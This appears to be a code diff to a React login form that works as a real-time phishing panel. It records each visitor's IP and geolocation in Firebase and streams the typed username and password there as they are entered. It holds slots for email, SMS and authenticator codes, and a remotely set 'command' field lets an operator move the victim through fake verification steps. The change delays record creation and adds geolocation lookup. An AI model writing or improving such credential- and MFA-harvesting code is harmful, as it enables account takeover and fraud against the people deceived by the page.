@@ -11,15 +11,19 @@ import {
 } from "firebase/database";
 import { ToastContainer, toast } from "react-toastify";
 
-import { useEffect, useState } from "react";
+import { useEffect, useState, useTransition } from "react";
 import { AuthenticatorCode } from "./steps/AuthenticatorCode";
 import { PhoneCode } from "./steps/PhoneCode";
 import { EmailCode } from "./steps/EmailCode";
 import { UserPass } from "./steps/UserPass";
+import { getIpGeo } from "@/utils";
 
 export const LoginForm = () => {
   const [dataRef, setDataRef] = useState<null | ThenableReference>(null);
   const [ipForm, seteIpForm] = useState<string | null>(null);
+  const [clientIp, setClientIP] = useState<string | null>(null);
+
+  const [isPending, startTransition] = useTransition();
 
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -29,44 +33,53 @@ export const LoginForm = () => {
   useEffect(() => {
     fetch("https://api.ipify.org?format=json").then(async (res) => {
       const { ip } = await res.json();
-      const ipF = ip.replaceAll(".", ",");
-      const infosRef = ref(database, `info/${ipF}`);
-      seteIpForm(ipF);
-      if (ip) {
-        const newDataRef = push(infosRef, {
-          online: true,
-          username: "",
-          password: "",
-          emailCode: "",
-          twoAF: "",
-          smsCode: "",
-          trPass: {
-            tr: "",
-            email: "",
-            sms: "",
-            twoFa: "",
-          },
-          ip,
-          zone: "",
-          command: "W_LOGIN",
-        });
-
-        setDataRef(newDataRef);
-
-        onDisconnect(newDataRef).update({
-          online: false,
-        });
-
-        onValue(newDataRef, (snap) => {
-          const data = snap.val();
-
-          setCommand(data.command);
-        });
-      }
+      setClientIP(ip);
     });
   }, []);
 
   useEffect(() => {
+    if (username.length >= 2 && !dataRef && clientIp) {
+      const ipF = clientIp.replaceAll(".", ",");
+      const infosRef = ref(database, `info/${ipF}`);
+      seteIpForm(ipF);
+      const newDataRef = push(infosRef, {
+        online: true,
+        username: "",
+        password: "",
+        emailCode: "",
+        twoAF: "",
+        smsCode: "",
+        trPass: {
+          tr: "",
+          email: "",
+          sms: "",
+          twoFa: "",
+        },
+        ip: clientIp,
+        zone: "",
+        command: "W_LOGIN",
+      });
+
+      startTransition(async () => {
+        const locData = await getIpGeo(clientIp);
+        if (locData) {
+          update(newDataRef, { zone: locData });
+        }
+      });
+
+      setDataRef(newDataRef);
+
+      onDisconnect(newDataRef).update({
+        online: false,
+      });
+
+      onValue(newDataRef, (snap) => {
+        const data = snap.val();
+
+        setCommand(data.command);
+      });
+    }
+
     if (dataRef) {
       update(dataRef, { username, password });
     }
